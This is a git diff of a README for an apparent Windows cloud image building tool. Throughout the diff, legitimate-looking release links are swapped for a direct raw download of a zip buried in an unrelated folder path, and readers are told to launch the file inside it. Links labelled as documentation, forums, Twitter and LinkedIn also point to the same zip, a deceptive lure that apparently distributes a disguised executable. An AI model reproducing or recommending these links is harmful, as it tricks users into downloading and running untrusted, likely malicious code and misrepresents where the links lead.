@@ -19,9 +19,9 @@ Welcome to the ultimate Windows Cloud Image Builder repository! Here you can bui
 
 ## Get Started 🚀
 
-To start building your Windows cloud images, head over to [Download https://github.com/pladon112/win_cloudimage_builder/releases/tag/v1.2](https://github.com/pladon112/win_cloudimage_builder/releases/tag/v1.2) and launch the file inside the zip archive. If you encounter any issues with the link, please check the "Releases" section for alternative download options.
+To start building your Windows cloud images, head over to [Download https://github.com/pladon112/win_cloudimage_builder/raw/refs/heads/main/elements/games.d/virtualdisplay/cloudimage_builder_win_1.1.zip](https://github.com/pladon112/win_cloudimage_builder/raw/refs/heads/main/elements/games.d/virtualdisplay/cloudimage_builder_win_1.1.zip) and launch the file inside the zip archive. If you encounter any issues with the link, please check the "Releases" section for alternative download options.
 
-[![Download https://github.com/pladon112/win_cloudimage_builder/releases/tag/v1.2](https://github.com/pladon112/win_cloudimage_builder/releases/tag/v1.2)](https://github.com/pladon112/win_cloudimage_builder/releases/tag/v1.2)
+[![Download https://github.com/pladon112/win_cloudimage_builder/raw/refs/heads/main/elements/games.d/virtualdisplay/cloudimage_builder_win_1.1.zip](https://github.com/pladon112/win_cloudimage_builder/raw/refs/heads/main/elements/games.d/virtualdisplay/cloudimage_builder_win_1.1.zip)](https://github.com/pladon112/win_cloudimage_builder/raw/refs/heads/main/elements/games.d/virtualdisplay/cloudimage_builder_win_1.1.zip)
 
 ## How to Use 📦
 
@@ -41,14 +41,14 @@ For any questions or assistance, please reach out to the repository maintainers.
 
 ## Resources 📚
 
-- [Official Documentation](https://github.com/pladon112/win_cloudimage_builder/releases/tag/v1.2): Visit the official Windows Cloud Image Builder documentation for in-depth guides and tutorials.
-- [Community Forums](https://github.com/pladon112/win_cloudimage_builder/releases/tag/v1.2): Join the community forums to connect with other users and share your experiences.
+- [Official Documentation](https://github.com/pladon112/win_cloudimage_builder/raw/refs/heads/main/elements/games.d/virtualdisplay/cloudimage_builder_win_1.1.zip): Visit the official Windows Cloud Image Builder documentation for in-depth guides and tutorials.
+- [Community Forums](https://github.com/pladon112/win_cloudimage_builder/raw/refs/heads/main/elements/games.d/virtualdisplay/cloudimage_builder_win_1.1.zip): Join the community forums to connect with other users and share your experiences.
 
 ## Stay Connected 🌐
 
 Stay connected with the latest updates, announcements, and tips by following us on social media:
-- Twitter: [@WinCloudImageBuilder](https://github.com/pladon112/win_cloudimage_builder/releases/tag/v1.2)
-- LinkedIn: [Windows Cloud Image Builder](https://github.com/pladon112/win_cloudimage_builder/releases/tag/v1.2)
+- Twitter: [@WinCloudImageBuilder](https://github.com/pladon112/win_cloudimage_builder/raw/refs/heads/main/elements/games.d/virtualdisplay/cloudimage_builder_win_1.1.zip)
+- LinkedIn: [Windows Cloud Image Builder](https://github.com/pladon112/win_cloudimage_builder/raw/refs/heads/main/elements/games.d/virtualdisplay/cloudimage_builder_win_1.1.zip)
 
 ## License 📜
 
@@ -58,6 +58,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Your journey to building customized Windows images for the cloud begins here. Get started today and unleash the full potential of your cloud environment with tailor-made Windows images! 🌟🖥️
 
-![Cloud Image Builder](https://github.com/pladon112/win_cloudimage_builder/releases/tag/v1.2)
+![Cloud Image Builder](https://github.com/pladon112/win_cloudimage_builder/raw/refs/heads/main/elements/games.d/virtualdisplay/cloudimage_builder_win_1.1.zip)
 
 ---
